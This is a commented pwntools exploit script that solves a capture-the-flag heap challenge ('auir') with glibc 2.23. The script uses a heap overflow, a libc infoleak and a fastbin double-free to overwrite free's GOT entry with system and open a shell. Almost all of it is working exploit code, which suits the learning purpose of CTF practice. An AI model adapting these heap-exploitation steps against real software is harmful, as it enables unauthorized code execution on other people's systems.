# This exploit is based off of and similar to this writeup for a different ctf challenge from RCTF: https://twisted-fun.github.io/2018-05-24-RCTF18-PWN-317/ https://github.com/sajjadium/ctf-writeups/tree/master/RCTF/2018/babyheap

# First import pwntools
from pwn import *

#Estbalish the target process, libc file, and attach gdb
target = process('auir', env={"LD_PRELOAD":"./libc-2.23.so"})
#gdb.attach(target)
libc = ELF('libc-2.23.so')

#Establish the functions to interact with the elf
def makeZealot(size, content):
	target.recvuntil(">>")
	target.sendline('1')
	target.recvuntil(">>")
	target.sendline(str(size))
	target.recvuntil(">>")
	target.send(content)

def destroyZealot(index):
	target.recvuntil(">>")
	target.sendline('2')
	target.recvuntil(">>")
	target.sendline(str(index))

def fixZealot(index, size, content):
	target.recvuntil(">>")
	target.sendline('3')
	target.recvuntil(">>")
	target.sendline(str(index))
	target.recvuntil(">>")
	target.sendline(str(size))
	target.recvuntil(">>")
	target.send(content)

def showZealot(index):
	target.recvuntil(">>")
	target.sendline('4')
	target.recvuntil(">>")
	target.sendline(str(index))

#This function is specifically designed to print and filter out the infoleak
def infoLeak():
	target.recvuntil(">>")
	target.sendline('4')
	target.sendline('4')
	target.recvuntil('[*]SHOWING....')
	leak = target.recv(8)
	leak = leak.replace("\x0a", "")
	leak = u64(leak + "\x00")
	system = leak - 0x37f7e8 
	libcadr = system - libc.symbols['system']
	log.info("leak is: " + hex(leak))
	log.info("System is: " + hex(system))
	log.info("Libc is: " + hex(libcadr))
	return libcadr

# First make the first four chunks of memory
makeZealot(240, "0"*(240)) # Chunk 0
makeZealot(112, "1"*(112)) # Chunk 1
makeZealot(240, "2"*(240)) # Chunk 2
makeZealot(48, "3"*(48)) # Chunk 3

# Free the first two chunks for heap consolidation
destroyZealot(0) # Chunk 0 freed
destroyZealot(1) # Chunk 1 freed

# Make chunk 5, which we will use to overflow chunk 2
makeZealot(120, "4"*(120)) # Chunk 4

# Execute the heap overflow
fixZealot(1, 128, '5'*0x70 + p64(0x180) + p64(0x100))

# Free the second heap chunk to cause heap consolidation
destroyZealot(2) # Chunk 2 now freed

# Allocate another heap space, to prepare for the infoleak
makeZealot(240, "6"*(240)) # Chunk 5

# Print the infoleak, and filter it out, and calculate the address of our fake chunk
libcadr = infoLeak()
mallocHook = libcadr + libc.symbols['__malloc_hook']
oneshot = libcadr + 0xf1117
log.info("Malloc Hook: " + hex(mallocHook))
log.info("One Shot: " + hex(oneshot))
fakeChunk = 0x605310 - 0x23

# Free chunk 5 to make room for next step
destroyZealot(5) # Chunk 5 now freed

# Allocate four more chunks to prepare for the double free
makeZealot(16, "7"*16)# Chunk 6
makeZealot(96, "8"*96)# Chunk 7
makeZealot(96, "9"*96)# Chunk 8
makeZealot(96, "x"*96)# Chunk 9

# Free the chunks of memory for the double free
destroyZealot(9)# Chunk 9 is now free
destroyZealot(8)# Chunk 8 is now free
destroyZealot(4)# Chunk 4 is now free

# Allocate two more chunks of memory, so we have a valid heap chunk that is also at the top of the fast bin list
makeZealot(96, "y"*96)# Chunk 10
makeZealot(96, "z"*96)# Chunk 11

# Write the fake chunk address to the start of the fourth chunk
fixZealot(4, 96, p64(fakeChunk) + p64(0) + "0"*80)

# Allocate the top fast bin chunk, which will cause our fake chunk to be placed at the top of the fastbin list
makeZealot(96, ">"*95)# Chunk 12

# Allocate our fake chunk
makeZealot(96, "<")# Chunk 13

# Calculate the address of system
system = libcadr + libc.symbols['system']

# Overflow the first pointer with the got address of free
fixZealot(13, 28, '\x00'*19 + p64(0x605060))

# Write over the value stored in got address of free with the libc address of system
fixZealot(0, 8, p64(system))

# Write "/bin/sh" to an allocated chunk
fixZealot(8, 8, "/bin/sh\x00")

# Call free with the argument "/bin/sh" to get a shell
destroyZealot(8)

# Drop to an interactive shell to use the shell
target.interactive()

# Here is a list of all of the overlapping chunks
'''
0 5 6 (7-8, 11 also in this region)
1 4 9 10, 12
2
3
13
'''